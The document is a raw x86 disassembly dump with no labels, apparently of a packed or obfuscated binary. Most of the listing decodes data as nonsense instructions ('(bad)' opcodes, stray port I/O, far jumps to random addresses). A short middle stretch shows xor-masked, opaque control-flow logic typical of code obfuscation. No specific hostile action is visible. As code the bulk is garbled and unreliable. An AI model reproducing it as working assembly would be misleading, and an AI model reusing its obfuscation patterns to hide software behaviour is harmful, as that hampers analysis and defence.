  41ec15:	cdq    
  41ec16:	ret    
  41ec17:	js     0x41ec25
  41ec19:	scas   al,BYTE PTR es:[edi]
  41ec1a:	call   0x915f4eb3
  41ec1f:	pop    ebx
  41ec20:	push   ds
  41ec21:	js     0x41ec7c
  41ec23:	xor    esi,ebp
  41ec25:	sbb    DWORD PTR [edx+0x41d3f22d],ebx
  41ec2b:	add    DWORD PTR [eax],0xd24585ae
  41ec31:	cmp    eax,0x97dee281
  41ec36:	jecxz  0x41ec20
  41ec38:	push   ss
  41ec39:	imul   eax,DWORD PTR [ebp+0x80f2cc5],0xffffff96
  41ec40:	shl    BYTE PTR [eax-0x3254800f],cl
  41ec46:	inc    ebp
  41ec47:	adc    al,0x9f
  41ec49:	stos   BYTE PTR es:[edi],al
  41ec4a:	or     al,0x1a
  41ec4c:	mov    dl,0x78
  41ec4e:	lea    esp,[edx-0x31d7fdf3]
  41ec54:	aam    0xcb
  41ec56:	xchg   edi,eax
  41ec57:	cmc    
  41ec58:	icebp  
  41ec59:	fadd   st(7),st
  41ec5b:	arpl   WORD PTR ds:0x3456eda6,sp
  41ec61:	mov    esp,0x26545fd8
  41ec66:	pop    esp
  41ec67:	lds    cx,DWORD PTR [esp+ebx*1]
  41ec6b:	pop    ebp
  41ec6c:	in     eax,0x94
  41ec6e:	xor    al,dh
  41ec70:	rcr    esp,cl
  41ec72:	in     eax,dx
  41ec73:	cmp    esp,DWORD PTR [ebp+0x73a0a483]
  41ec79:	lods   al,BYTE PTR ds:[esi]
  41ec7a:	mov    bh,0x3f
  41ec7c:	add    bh,BYTE PTR [ecx]
  41ec7e:	push   cs
  41ec7f:	pushf  
  41ec80:	fimul  DWORD PTR [ecx+0x1b]
  41ec83:	jne    0x41ec16
  41ec85:	cmp    esp,edx
  41ec87:	sub    BYTE PTR [edi+0x2c],dl
  41ec8a:	scas   eax,DWORD PTR es:[edi]
  41ec8b:	mov    cl,al
  41ec8d:	jge    0x41ed05
  41ec8f:	sub    eax,0xb306fe44
  41ec94:	pop    ebp
  41ec95:	inc    ebp
  41ec96:	jl     0x41ecd7
  41ec98:	sti    
  41ec99:	xor    eax,0xc2d2cf86
  41ec9e:	ret    
  41ec9f:	mov    esp,DWORD PTR [ebp+0x2e]
  41eca2:	mov    ds:0x403f3669,al
  41eca7:	mov    ds:0x5549e93c,al
  41ecac:	mov    bl,0xca
  41ecae:	mov    dl,0xbf
  41ecb0:	aaa    
  41ecb1:	and    esi,DWORD PTR [ebx-0x55]
  41ecb4:	or     dl,bh
  41ecb6:	mov    ch,BYTE PTR [ecx]
  41ecb8:	ja     0x41ec50
  41ecba:	jns    0x41ed2e
  41ecbc:	pop    eax
  41ecbd:	call   0x6ddf18c5
  41ecc2:	mov    ds:0xf243df73,eax
  41ecc7:	lods   al,BYTE PTR ds:[esi]
  41ecc8:	dec    ebx
  41ecc9:	or     BYTE PTR [edx+0x15],dh
  41eccc:	mov    WORD PTR [ebp+ebp*2+0x34],?
  41ecd0:	and    DWORD PTR [ebx-0x50],eax
  41ecd3:	inc    DWORD PTR [ebx]
  41ecd5:	jl     0x41ec86
  41ecd7:	cdq    
  41ecd8:	call   0xe642ace1
  41ecdd:	sbb    eax,0x21827aa1
  41ece2:	repnz repz fidiv DWORD PTR [ebx-0xb6d3bac]
  41ecea:	jecxz  0x41ec86
  41ecec:	ret    
  41eced:	ins    DWORD PTR es:[edi],dx
  41ecee:	bound  ebx,QWORD PTR [esi+0x17]
  41ecf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecf2:	les    edi,FWORD PTR [edi]
  41ecf4:	cld    
  41ecf5:	call   0xb20d2c4a
  41ecfa:	or     cl,0x75
  41ecfd:	fsub   st(2),st
  41ecff:	jl     0x41ed54
  41ed01:	nop
  41ed02:	inc    eax
  41ed03:	jg     0x41eceb
  41ed05:	mov    cl,0x46
  41ed07:	mov    ebx,edx
  41ed09:	fdivr  st,st(4)
  41ed0b:	(bad)  
  41ed0c:	xor    al,ch
  41ed0e:	sbb    DWORD PTR [eax-0x23],esi
  41ed11:	xor    al,0xa2
  41ed13:	mov    ds:0xb887bd8e,eax
  41ed18:	call   eax
  41ed1a:	sub    eax,0xae7b9ff9
  41ed1f:	enter  0x7c43,0xb5
  41ed23:	js     0x41ed51
  41ed25:	loopne 0x41ed2a
  41ed27:	xor    al,dl
  41ed29:	stc    
  41ed2a:	push   edx
  41ed2b:	sub    BYTE PTR [edx*4+0x3101000a],bh
  41ed32:	adc    edi,0x772e0953
  41ed38:	push   ebx
  41ed39:	jmp    0xa23df177
  41ed3e:	daa    
  41ed3f:	popf   
  41ed40:	xor    dl,0xd2
  41ed43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed44:	inc    edx
  41ed45:	sar    BYTE PTR [edi],0x35
  41ed48:	(bad)  
  41ed49:	mov    ebp,0x862cf772
  41ed4e:	dec    ecx
  41ed4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed50:	mov    ds:0x6662137,al
  41ed55:	jecxz  0x41ed09
  41ed57:	cmovge esi,DWORD PTR [ecx-0x4ba12092]
  41ed5e:	push   ds
  41ed5f:	add    al,0x1c
  41ed61:	aam    0x6c
  41ed63:	clc    
  41ed64:	fs jno 0x41eddf
  41ed67:	pop    esp
  41ed68:	pop    esi
  41ed69:	psadbw mm5,QWORD PTR [edi]
  41ed6c:	aam    0x49
  41ed6e:	(bad)  
  41ed6f:	dec    DWORD PTR [ecx]
  41ed71:	adc    eax,0xf5297da8
  41ed76:	push   ecx
  41ed77:	mov    ecx,0x2f3d7403
  41ed7c:	push   eax
  41ed7d:	outs   dx,BYTE PTR ds:[esi]
  41ed7e:	dec    esp
  41ed7f:	rcl    DWORD PTR [esi+0x10],0xdd
  41ed83:	dec    esp
  41ed84:	fcomp  DWORD PTR [ebx-0x2e23777c]
  41ed8a:	jbe    0x41ed4d
  41ed8c:	fwait
  41ed8d:	sti    
  41ed8e:	mov    al,ds:0xe9f05795
  41ed93:	aas    
  41ed94:	ret    0x772a
  41ed97:	sbb    DWORD PTR [ebx+esi*1+0x3d],edx
  41ed9b:	mov    dh,0x6c
  41ed9d:	arpl   WORD PTR [ebx+0x3bbad28b],sp
  41eda3:	lods   al,BYTE PTR ds:[esi]
  41eda4:	std    
  41eda5:	jns    0x41ed9b
  41eda7:	mov    ch,0x87
  41eda9:	jno    0x41ede1
  41edab:	push   edi
  41edac:	shl    bh,1
  41edae:	test   eax,0x76b96ee1
  41edb3:	imul   ebp
  41edb5:	pop    edx
  41edb6:	enter  0x6e8e,0xec
  41edba:	push   cs
  41edbb:	sbb    BYTE PTR [esi-0x2543000a],bl
  41edc1:	cli    
  41edc2:	fdiv   QWORD PTR [ecx-0x62]
  41edc5:	inc    edx
  41edc6:	add    BYTE PTR [ecx-0x2d3dc779],dl
  41edcc:	dec    edi
  41edcd:	xor    eax,0xddd7a1c1
  41edd2:	pop    ebx
  41edd3:	sbb    bh,dl
  41edd5:	das    
  41edd6:	iret   
  41edd7:	scas   eax,DWORD PTR es:[edi]
  41edd8:	mov    ecx,0x2b60c826
  41eddd:	loop   0x41eda8
  41eddf:	lahf   
  41ede0:	adc    edx,eax
  41ede2:	pop    eax
  41ede3:	aaa    
  41ede4:	inc    esp
  41ede5:	loop   0x41ed71
  41ede7:	dec    ecx
  41ede8:	push   cs
  41ede9:	(bad)  
  41edea:	mov    dh,0xe2
  41edec:	fnstsw WORD PTR [esi-0x2d20f475]
  41edf2:	jno    0x41eda8
  41edf4:	test   al,0xe
  41edf6:	and    ch,cl
  41edf8:	loopne 0x41eda3
  41edfa:	cli    
  41edfb:	aaa    
  41edfc:	adc    eax,0x28b81b4
  41ee01:	pushf  
  41ee02:	sbb    ebp,DWORD PTR [esi]
  41ee04:	shr    DWORD PTR [ecx+0x7eec6024],cl
  41ee0a:	or     DWORD PTR [eax+ebx*2+0xf23b874],esi
  41ee11:	mov    WORD PTR [ebx],cs
  41ee13:	xchg   edx,eax
  41ee14:	mov    eax,ds:0xb9043d3c
  41ee19:	and    eax,ebp
  41ee1b:	jmp    0xa3a3:0x4161cca1
  41ee22:	ret    0xbc3a
  41ee25:	addr16 mov ebp,0xc952fc3a
  41ee2b:	mov    ds:0xd05a75a0,al
  41ee30:	or     al,0xf5
  41ee32:	retf   0x8553
  41ee35:	add    cl,BYTE PTR [ecx*1-0x4db185f5]
  41ee3c:	rcl    DWORD PTR [eax],0x16
  41ee3f:	mov    ebx,0xceb98f96
  41ee44:	push   ss
  41ee45:	or     esp,ebp
  41ee47:	jb     0x41eea9
  41ee49:	jle    0x41ee8c
  41ee4b:	pop    esp
  41ee4c:	add    eax,0x7d15d6e3
  41ee51:	mov    bh,0xef
  41ee53:	sar    eax,cl
  41ee55:	add    BYTE PTR [ecx],0xcd
  41ee58:	daa    
  41ee59:	(bad)  
  41ee5a:	mov    ebx,0x36db2e2a
  41ee5f:	gs addr16 cmp eax,0xb7b575a7
  41ee66:	adc    BYTE PTR [ecx-0x5c337eb5],dl
  41ee6c:	inc    ebp
  41ee6d:	adc    al,0xa3
  41ee6f:	stc    
  41ee70:	shl    ch,0xd4
  41ee73:	mov    ds:0xfc8b8ad6,al
  41ee78:	out    dx,eax
  41ee79:	(bad)  
  41ee7b:	cmc    
  41ee7c:	inc    esp
  41ee7d:	dec    ebx
  41ee7e:	pop    eax
  41ee7f:	sahf   
  41ee80:	arpl   WORD PTR [ebp+0x6d],bx
  41ee83:	loop   0x41ee6e
  41ee85:	dec    eax
  41ee86:	jnp    0x41eed3
  41ee88:	out    0x2b,eax
  41ee8a:	mov    ch,0xdb
  41ee8c:	sub    DWORD PTR [edx],ebp
  41ee8e:	push   esi
  41ee8f:	mov    bl,0xab
  41ee91:	rcl    BYTE PTR [ebp+0x19],cl
  41ee94:	jnp    0x41ee94
  41ee96:	jmp    0x41ee3a
  41ee98:	loope  0x41eeb6
  41ee9a:	jno    0x41eed2
  41ee9c:	jg     0x41ee61
  41ee9e:	mov    cl,0xad
  41eea0:	push   ss
  41eea1:	and    dh,BYTE PTR [ebp+0x17fa1f21]
  41eea7:	mov    ecx,DWORD PTR [edx-0x59ed8494]
  41eead:	and    DWORD PTR [eax+0x52],0x5f574d34
  41eeb4:	push   es
  41eeb5:	xchg   esi,eax
  41eeb6:	xchg   esp,eax
  41eeb7:	dec    ebx
  41eeb8:	call   0xdacd82f0
  41eebd:	stos   BYTE PTR es:[edi],al
  41eebe:	xchg   ebp,eax
  41eebf:	push   cs
  41eec0:	mov    esi,0x4a4eca40
  41eec5:	xlat   BYTE PTR ds:[ebx]
  41eec6:	push   edx
  41eec7:	stos   BYTE PTR es:[edi],al
  41eec8:	ins    DWORD PTR es:[edi],dx
  41eec9:	cmp    BYTE PTR [eax+ebx*8],cl
  41eecc:	(bad)  
  41eecd:	into   
  41eece:	(bad)  
  41eecf:	fnsave ds:0x315ab6dd
  41eed5:	push   eax
  41eed6:	fistp  QWORD PTR [ecx]
  41eed8:	adc    cl,BYTE PTR [ebp+0x72]
  41eedb:	and    al,0x51
  41eedd:	adc    bl,dh
  41eedf:	push   es
  41eee0:	mov    dh,0x63
  41eee2:	xchg   ebp,eax
  41eee3:	mov    al,bh
  41eee5:	es pop ebx
  41eee7:	daa    
  41eee8:	push   eax
  41eee9:	cdq    
  41eeea:	xor    ecx,DWORD PTR [eax-0x60]
  41eeed:	cmc    
  41eeee:	loopne 0x41ef3a
  41eef0:	in     al,0x68
  41eef2:	jp     0x41ef68
  41eef4:	add    eax,DWORD PTR [ecx-0x6415292f]
  41eefa:	cld    
  41eefb:	sub    ch,bh
  41eefd:	xchg   ebx,eax
  41eefe:	jnp    0x41ef4f
  41ef00:	lock sbb DWORD PTR [ecx],ecx
  41ef03:	sub    ebx,edi
  41ef05:	sbb    esp,esi
  41ef07:	out    dx,al
  41ef08:	bound  esp,QWORD PTR [ebx]
  41ef0a:	push   ss
  41ef0b:	adc    BYTE PTR [bx+si-0x30],dl
  41ef0f:	mov    ss,WORD PTR cs:[edx+0x72854dca]
  41ef16:	sbb    al,0x2f
  41ef18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef19:	xchg   ebx,eax
  41ef1a:	add    eax,0x9a5e0f4e
  41ef1f:	adc    BYTE PTR [esi],ch
  41ef21:	jbe    0x41ef28
  41ef23:	clc    
  41ef24:	ror    dl,cl
  41ef26:	stos   WORD PTR es:[edi],ax
  41ef28:	ins    BYTE PTR es:[edi],dx
  41ef29:	outs   dx,DWORD PTR ds:[esi]
  41ef2a:	sub    eax,0x5c67b578
  41ef2f:	test   esi,ecx
  41ef31:	das    
  41ef32:	mov    bl,0x6f
  41ef34:	dec    ebp
  41ef35:	xor    DWORD PTR [edx-0x4],ebp
  41ef38:	cmp    bl,al
  41ef3a:	nop
  41ef3b:	dec    edi
  41ef3c:	cmp    cl,BYTE PTR [ebp-0x3e]
  41ef3f:	push   ebx
  41ef40:	mov    dl,BYTE PTR [ebx-0x31]
  41ef43:	mov    edi,0x4e720aa1
  41ef48:	shr    DWORD PTR [edi-0x7b76e8eb],1
  41ef4e:	mov    al,0x4a
  41ef50:	in     eax,0xce
  41ef52:	cmp    ebx,ebp
  41ef54:	repnz retf 0x4f8b
  41ef58:	mov    gs,WORD PTR [ebp-0x5b29b67e]
  41ef5e:	jne    0x41ef56
  41ef60:	les    esp,FWORD PTR [eax+0x4d]
  41ef63:	fdivr  st(4),st
  41ef65:	add    al,0xbe
  41ef67:	add    al,BYTE PTR [ebp-0xe37e32]
  41ef6d:	cs mov ah,0xe9
  41ef70:	adc    al,0x6b
  41ef72:	and    esp,DWORD PTR [ebx+edi*1-0x38]
  41ef76:	fadd   QWORD PTR [ebp+ebp*4+0x39]
  41ef7a:	bnd js 0x41ef59
  41ef7d:	aaa    
  41ef7e:	sbb    bl,ah
  41ef80:	push   ebp
  41ef81:	enter  0x9122,0xf5
  41ef85:	aaa    
  41ef86:	jnp    0x41ef9c
  41ef88:	inc    edi
  41ef89:	sub    eax,0x525ebcbe
  41ef8e:	pop    esp
  41ef8f:	xchg   edi,eax
  41ef90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef91:	popa   
  41ef92:	fdivr  QWORD PTR [edx+0x2b]
  41ef95:	pop    ss
  41ef96:	inc    edi
  41ef97:	pop    ecx
  41ef98:	shr    BYTE PTR [edi-0x7a763d01],1
  41ef9e:	mov    DWORD PTR [ebx+edx*4],esp
  41efa1:	jbe    0x41efb6
  41efa3:	dec    esp
  41efa4:	adc    eax,0x1b8db520
  41efa9:	mov    ch,0x96
  41efab:	pop    es
  41efac:	test   BYTE PTR [ebx+0x5ddb67dc],al
  41efb2:	jo     0x41efc0
  41efb4:	daa    
  41efb5:	pop    ebp
  41efb6:	push   ss
  41efb7:	test   eax,0xe4faf7cf
  41efbc:	push   ss
  41efbd:	jp     0x41efb5
  41efbf:	shr    DWORD PTR [edx],1
  41efc1:	add    esp,DWORD PTR [eax+esi*4-0x3b]
  41efc5:	cmp    eax,0xeef8d099
  41efca:	(bad)  
  41efcb:	icebp  
  41efcc:	and    al,0xd6
  41efce:	out    0xf1,eax
  41efd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efd1:	(bad)  
  41efd2:	das    
  41efd3:	push   es
  41efd4:	aas    
  41efd5:	aaa    
  41efd6:	sbb    DWORD PTR [edi],ecx
  41efd8:	and    eax,0x3336714d
  41efde:	adc    ebp,ecx
  41efe0:	lea    eax,[esi-0x62]
  41efe3:	shr    BYTE PTR [edx-0x704e6d6],1
  41efe9:	add    eax,0x2c0161e0
  41efee:	adc    al,0x42
  41eff0:	gs ds out dx,al
  41eff3:	mov    ecx,0xe1f02e26
  41eff8:	call   0x33d1:0x64095e30
  41efff:	enter  0xce03,0xf
  41f003:	test   DWORD PTR [ebx-0x24],esp
  41f006:	(bad)  
  41f007:	dec    DWORD PTR [ebx+0x4d89f44d]
  41f00d:	or     cl,ch
  41f00f:	sub    eax,0x8b000000
  41f014:	dec    ebp
  41f015:	or     BYTE PTR [ebx-0x37cc07ab],cl
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xaee46403
  41f0bf:	cwde   
  41f0c0:	jle    0x41f113
  41f0c2:	fsub   DWORD PTR [ecx+0x62]
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx-0x49]
  41f0ca:	cmp    al,0x2c
  41f0cc:	(bad)  
  41f0cd:	dec    edx
  41f0ce:	add    DWORD PTR [eax-0x29],ebp
  41f0d1:	xchg   ah,ch
  41f0d3:	adc    DWORD PTR [ebp+0x7d187aa4],edi
  41f0d9:	mov    bh,0x6e
  41f0db:	cwde   
  41f0dc:	push   es
  41f0dd:	call   0x1981:0x9674c213
  41f0e4:	xchg   esp,eax
  41f0e5:	scas   eax,DWORD PTR es:[edi]
  41f0e6:	inc    ecx
  41f0e7:	les    edi,FWORD PTR [ebx+ecx*1]
  41f0ea:	cli    
  41f0eb:	faddp  st(4),st
  41f0ed:	jno    0x41f13f
  41f0ef:	sub    edx,DWORD PTR [ebx]
  41f0f1:	and    cl,bl
  41f0f3:	test   BYTE PTR [edx+0x39a8aba7],bl
  41f0f9:	imul   esi,DWORD PTR [esi],0x9063cbcc
  41f0ff:	bound  edx,QWORD PTR [edi]
  41f101:	iret   
  41f102:	xor    DWORD PTR [esi],edi
  41f104:	add    eax,0xebc4947
  41f109:	and    al,0x3d
  41f10b:	mov    bh,0xde
  41f10d:	pop    ds
  41f10e:	add    ecx,DWORD PTR [ebx]
  41f110:	arpl   WORD PTR ss:0x76da0c3b,ax
  41f117:	aaa    
  41f118:	ficom  DWORD PTR [ecx+eiz*4+0x68]
  41f11c:	ds xchg edi,eax
  41f11e:	mov    eax,ds:0xa64a80e9
  41f123:	sbb    eax,esi
  41f125:	pushf  
  41f126:	aas    
  41f127:	cdq    
  41f128:	lock imul esp,DWORD PTR es:[esi],0x49fba6f9
  41f130:	aad    0xf
  41f132:	sbb    ebx,DWORD PTR [eax]
  41f134:	push   ebx
  41f135:	cmp    DWORD PTR [esi],eax
  41f137:	pop    ds
  41f138:	mov    ebp,0x699229c2
  41f13d:	sub    eax,0xcf74de1c
  41f142:	mov    ebp,ebx
  41f144:	adc    dl,al
  41f146:	sub    BYTE PTR [edi+0xc],ch
  41f149:	inc    esi
  41f14a:	lods   eax,DWORD PTR ds:[esi]
  41f14b:	pop    es
  41f14c:	dec    edi
  41f14d:	pop    esp
  41f14e:	fistp  QWORD PTR [edx-0x5d]
  41f151:	idiv   eax
  41f153:	lds    ecx,FWORD PTR [eax+0x6977206f]
  41f159:	jno    0x41f19c
  41f15b:	fisubr WORD PTR [ecx]
  41f15d:	add    al,BYTE PTR [edi-0x68b96c67]
  41f163:	pushf  
  41f164:	cmp    DWORD PTR [esi],esp
  41f166:	in     al,dx
  41f167:	xchg   ecx,eax
  41f168:	dec    ebx
  41f169:	arpl   WORD PTR [esi-0x6954de8],bp
  41f16f:	inc    edi
  41f170:	sahf   
  41f171:	(bad)  
  41f173:	pop    esp
  41f174:	outs   dx,DWORD PTR ds:[esi]
  41f175:	outs   dx,BYTE PTR ds:[esi]
  41f176:	std    
  41f177:	int    0x6a
  41f179:	sub    DWORD PTR [ecx],ebp
  41f17b:	add    BYTE PTR [edi],al
  41f17d:	or     al,0x74
  41f17f:	pop    esi
  41f180:	cmp    al,0x0
  41f182:	aam    0x5d
  41f184:	inc    ebx
  41f185:	pop    esi
  41f186:	call   0xade2:0x25155927
  41f18d:	pusha  
  41f18e:	or     eax,0x26459b4c
  41f193:	in     eax,dx
  41f194:	pop    esp
  41f195:	sbb    BYTE PTR [edx],0x2d
  41f198:	cmp    DWORD PTR [ebp+0xd],ebx
  41f19b:	and    eax,0x6eb096b1
  41f1a0:	pushf  
  41f1a1:	cmp    esi,edx
  41f1a3:	clc    
  41f1a4:	fnsave [ecx-0x26abf691]
  41f1aa:	aas    
  41f1ab:	mov    ah,0x1c
  41f1ad:	mov    cl,0xe1
  41f1af:	ds out dx,eax
  41f1b1:	sbb    eax,0xb9474bfb
  41f1b6:	lahf   
  41f1b7:	ror    DWORD PTR [eax],0x69
  41f1ba:	cmp    eax,0xff7b986c
  41f1bf:	cli    
  41f1c0:	add    eax,0x42a067fe
  41f1c5:	test   DWORD PTR [edi],ebx
  41f1c7:	xchg   ebp,eax
  41f1c8:	ror    DWORD PTR [esi],cl
  41f1ca:	push   ds
  41f1cb:	xchg   edi,eax
  41f1cc:	cmp    ch,cl
  41f1ce:	aaa    
  41f1cf:	xor    BYTE PTR [edi],ch
  41f1d1:	call   0x28a29fca
  41f1d6:	sbb    al,0x66
  41f1d8:	xor    DWORD PTR [eax+0x2d],0xffffff80
  41f1dc:	aaa    
  41f1dd:	mov    bl,0xf4
  41f1df:	jge    0x41f1f0
  41f1e1:	gs jl  0x41f237
  41f1e4:	retf   0xab65
  41f1e7:	jo     0x41f250
  41f1e9:	add    al,0x3d
  41f1eb:	mov    bl,BYTE PTR [eax]
  41f1ed:	xchg   esp,eax
  41f1ee:	scas   al,BYTE PTR es:[edi]
  41f1ef:	jnp    0x41f20c
  41f1f1:	ret    
  41f1f2:	js     0x41f1e9
  41f1f4:	fucomi st,st(4)
  41f1f6:	jmp    0x41f1f8
  41f1f8:	mov    dh,0x4d
  41f1fa:	stos   DWORD PTR es:[edi],eax
  41f1fb:	or     ebx,DWORD PTR [ebx+esi*8]
  41f1fe:	ret    
  41f1ff:	ror    DWORD PTR [ecx+0x63],1
  41f202:	dec    ebp
  41f203:	arpl   WORD PTR [edx+0x644a51c0],dx
  41f209:	sbb    dh,al
  41f20b:	gs add eax,0x61c31af9
  41f211:	mov    eax,ds:0x16d62bd9
  41f216:	add    edx,DWORD PTR [edi]
  41f218:	xchg   esi,eax
  41f219:	in     eax,dx
  41f21a:	and    eax,0x7863b0da
  41f21f:	call   edi
  41f221:	or     eax,0x50d949fa
  41f226:	fidiv  WORD PTR [edi]
  41f228:	jmp    0xbc3e:0xe28b3af7
  41f22f:	jae    0x41f240
  41f231:	cmp    dh,BYTE PTR [edi-0x4e]
  41f234:	retf   
  41f235:	fld    TBYTE PTR [ebx]
  41f237:	and    dh,BYTE PTR [ecx+0x31]
  41f23a:	out    0xb8,al
  41f23c:	cdq    
  41f23d:	sub    DWORD PTR [ebx+ebp*4-0x44],0xbfd3b45a
  41f245:	pop    eax
  41f246:	test   DWORD PTR [ebx],edi
  41f248:	outs   dx,BYTE PTR ds:[esi]
  41f249:	loope  0x41f2c9
  41f24b:	dec    esp
  41f24c:	sbb    DWORD PTR [ebx],ecx
  41f24e:	ret    0xeba0
  41f251:	push   ebp
  41f252:	cmc    
  41f253:	into   
  41f254:	push   0xc65f6deb
  41f259:	stc    
  41f25a:	imul   edi,edx,0x60db5c23
  41f260:	fidiv  WORD PTR [ebp+0x7f]
  41f263:	xchg   ecx,eax
  41f264:	mov    eax,ds:0xdf2a27f9
  41f269:	mov    ds:0xec603a6d,eax
  41f26e:	sbb    DWORD PTR [ebp-0x7772c74],edi
  41f274:	cs ret 0x10ee
  41f278:	stos   DWORD PTR es:[edi],eax
  41f279:	xchg   edx,eax
  41f27a:	cmp    BYTE PTR [edx+0x34],dh
  41f27d:	jmp    0x41f2f1
  41f27f:	push   esi
  41f280:	fiadd  DWORD PTR [ecx]
  41f282:	rcl    BYTE PTR [ebx],1
  41f284:	fdiv   QWORD PTR [ecx+0x6e7c03de]
  41f28a:	jl     0x41f2ed
  41f28c:	pop    esp
  41f28d:	add    DWORD PTR [edi],esp
  41f28f:	fmulp  st(4),st
  41f291:	mov    edi,0x86962816
  41f296:	adc    ch,BYTE PTR [eax]
  41f298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f299:	fisubr WORD PTR [ecx]
  41f29b:	xor    ah,bh
  41f29d:	jle    0x41f29a
  41f29f:	inc    eax
  41f2a0:	enter  0x4c05,0xc4
  41f2a4:	add    ebp,DWORD PTR [eax]
  41f2a6:	(bad)  [edi-0xd]
  41f2a9:	inc    edi
  41f2aa:	lea    esi,[ecx]
  41f2ac:	stc    
  41f2ad:	cmc    
  41f2ae:	jo     0x41f283
  41f2b0:	pop    edi
  41f2b1:	out    0xb8,al
  41f2b3:	retf   0x5ae3
  41f2b6:	outs   dx,BYTE PTR ds:[si]
  41f2b8:	mov    ds:0xaa4415ea,al
  41f2bd:	sbb    cl,BYTE PTR [ecx-0x24]
  41f2c0:	dec    esp
  41f2c1:	pop    esp
  41f2c2:	xchg   ebp,eax
  41f2c3:	aaa    
  41f2c4:	dec    ecx
  41f2c5:	sub    eax,0x838928b2
  41f2ca:	sub    al,0x55
  41f2cc:	std    
  41f2cd:	loope  0x41f28a
  41f2cf:	xor    dl,BYTE PTR ds:0x8b459eb
  41f2d5:	sub    eax,0xb4f3b36f
  41f2da:	cmp    eax,0xea81b398
  41f2df:	mov    esp,DWORD PTR [ecx]
  41f2e1:	xchg   ecx,eax
  41f2e2:	add    ecx,DWORD PTR [eax-0x1468923a]
  41f2e8:	rol    BYTE PTR [eax*8-0x7e76998c],1
  41f2ef:	repz and DWORD PTR [edi-0x6c],eax
  41f2f3:	xchg   ecx,eax
  41f2f4:	out    dx,al
  41f2f5:	adc    al,ah
  41f2f7:	dec    edx
  41f2f8:	xor    BYTE PTR [eax+0x48],bl
  41f2fb:	call   0xb9c6b567
  41f300:	push   0x2e
  41f302:	mov    ch,0x1c
  41f304:	ret    0x8577
  41f307:	sahf   
  41f308:	cmp    esi,edx
  41f30a:	mov    ds:0xee11b750,eax
  41f30f:	xchg   edx,eax
  41f310:	jae    0x41f2b7
  41f312:	or     eax,0x1c58634e
  41f317:	ds nop
  41f319:	mov    ds:0x564ce6ac,eax
  41f31e:	aam    0x96
  41f320:	bound  edi,QWORD PTR [ecx]
  41f322:	or     al,0xd2
  41f324:	inc    edx
  41f325:	pop    ebx
  41f326:	dec    ecx
  41f327:	shr    DWORD PTR [ebx],0xab
  41f32a:	mov    BYTE PTR [esi],dl
  41f32c:	pop    ebp
  41f32d:	rcl    DWORD PTR [ebx+esi*4+0x8bfdef4],cl
  41f334:	jle    0x41f39a
  41f336:	ds cwde 
  41f338:	sub    BYTE PTR [edi-0x21],dl
  41f33b:	mov    ebp,0xd59fabbc
  41f340:	mov    DWORD PTR [esi],edx
  41f342:	and    eax,0xd7f506b7
  41f347:	adc    eax,0x959a72fa
  41f34c:	mov    dl,0x5
  41f34e:	or     eax,0xde9d126
  41f353:	inc    edi
  41f354:	or     dh,BYTE PTR [ebp-0x5320f7dd]
  41f35a:	add    eax,DWORD PTR [ebp+0x6ed3fde5]
  41f360:	fnstsw WORD PTR [ebx-0x36]
  41f363:	lahf   
  41f364:	ret    0x2371
  41f367:	jg     0x41f335
  41f369:	and    esi,DWORD PTR [eax]
  41f36b:	cmp    bh,BYTE PTR [esi]
  41f36d:	dec    ecx
  41f36e:	vaddss xmm6{k2}{z},xmm4,DWORD PTR gs:[ecx+0xb4]
  41f376:	xor    bh,BYTE PTR [edi+edi*2+0x22]
  41f37a:	push   esi
  41f37b:	xor    eax,0xeb57f1ad
  41f380:	ins    BYTE PTR es:[edi],dx
  41f381:	rdpmc  
  41f383:	push   esi
  41f384:	pop    ecx
  41f385:	mov    ebx,0x6e944066
  41f38a:	int3   
  41f38b:	sbb    eax,0x10bb993f
